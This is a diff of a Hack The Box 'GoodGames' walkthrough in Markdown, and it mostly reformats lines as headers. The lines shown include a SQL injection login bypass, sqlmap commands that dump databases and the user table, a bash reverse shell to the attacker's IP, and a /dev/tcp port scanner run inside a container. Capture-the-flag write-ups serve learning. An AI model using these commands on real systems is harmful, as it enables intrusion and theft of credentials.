@@ -14,8 +14,8 @@
 ## STORE: site is in progress, nothing interesting
 ![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/GoodGames/screenshots/goodgames.htb.coming-soon.png)
 
-Login Panel: goodgames.htb
-mail: @ is required and therefore not sqli testable --> intercept with burp 
+## Login Panel: goodgames.htb
+## mail: @ is required and therefore not sqli testable --> intercept with burp 
 ![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/GoodGames/screenshots/goodgames%20login%20page.png)
 
 Try simple sqli in login creds 
@@ -42,7 +42,7 @@ sqli:  'or 1=1-- -
 ![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/GoodGames/screenshots/internal-administration.goodgames.htb.login.png)
 
 # sqlmap
-//dump databases
+## dump databases
 ````
 sqlmap -r request-login.txt --dbs
 
@@ -51,7 +51,7 @@ sqlmap -r request-login.txt --dbs
 ## database snippet
 ![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/GoodGames/screenshots/sqlmap%20databases.png)
 
-dump database main and its tables entrys
+## dump database main and its tables entrys
 ````
 sqlmap -r request-login.txt -D main --tables
 
@@ -62,7 +62,7 @@ sqlmap -r request-login.txt --dbs --threads 10 --time-sec 1
 
 ## database main tables
 ![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/GoodGames/screenshots/sqlmap%20database%20main%20tables.png)
-dump user table
+## dump user table
 ````
 sqlmap -r request-login.txt -D main -T user --dump
 
@@ -104,22 +104,22 @@ bash -i >& /dev/tcp/10.10.14.5/1111 0>&1
 
 ![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/GoodGames/screenshots/docker%20shell.png)
 
-ls -la on entrypoint of shell shows dockerfile!
+## ls -la on entrypoint of shell shows dockerfile!
 ![](initial shell list files.png)
 augustus got user name: 1000 --> docker?
-mount shows that the home directory is mounted
+## mount shows that the home directory is mounted
 ![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/GoodGames/screenshots/home.augustus%20is%20mounted.png)
 
-internal ip of docker: 172.19.0.2
+## internal ip of docker: 172.19.0.2
 ![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/GoodGames/screenshots/shell%20list%20networks.png)
 
 
-nmap isnt installed on machine; make own bash script like this:
+## nmap isnt installed on machine; make own bash script like this:
 ````
 for port in $(seq 1 1000); do (echo "blah" > /dev/tcp/172.19.0.1/$port && echo "open - $port") 2>/dev/null; done
 
 `````
-writes blah to the port and if succeeds (&&) it will print open port
+## writes blah to the port and if succeeds (&&) it will print open port
 
 ![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/GoodGames/screenshots/bash%20custom%20port%20scanner.png)
 
